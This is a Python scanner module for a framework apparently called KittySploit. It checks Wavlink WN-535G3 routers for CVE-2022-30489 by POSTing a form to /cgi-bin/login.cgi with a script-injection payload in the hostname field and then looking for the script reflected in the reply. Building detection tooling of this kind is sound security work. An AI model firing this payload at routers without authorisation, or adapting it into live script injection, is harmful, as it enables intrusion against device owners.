#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Wavlink WN-535G3 contains a POST cross-site scripting vulnerability via the hostname parameter at /cgi-bin/log."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Wavlink WN-535G3 - Cross-Site Scripting Detection',
        'description': 'Wavlink WN-535G3 contains a POST cross-site scripting vulnerability via the hostname parameter at /cgi-bin/login.cgi.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'xss', 'wavlink', 'router', 'iot', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/badboycxcc/XSS-CVE-2022-30489',
            'https://github.com/badboycxcc/XSS',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-30489',
            'https://github.com/trhacknon/Pocingit',
            'https://github.com/trhacknon/XSS-CVE-2022-30489',
        ],
        'cve': 'CVE-2022-30489',
    }

    def run(self):
        path = '/cgi-bin/login.cgi'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='newUI=1&page=login&username=admin&langChange=0&ipaddr=x.x.x.x&login_page=login.shtml&homepage=main.shtml&sysinitpage=sysinit.shtml&hostname=")</script><script>alert(document.domain);</script>&key=M27234733&password=63a36bceec2d3bba30d8611c323f4cda&lang_=cn\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<script>alert(document.domain);</script>', 'parent.location.replace("http://")',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Wavlink WN-535G3 - Cross-Site Scripting detected', path=path)
            return True
        return False

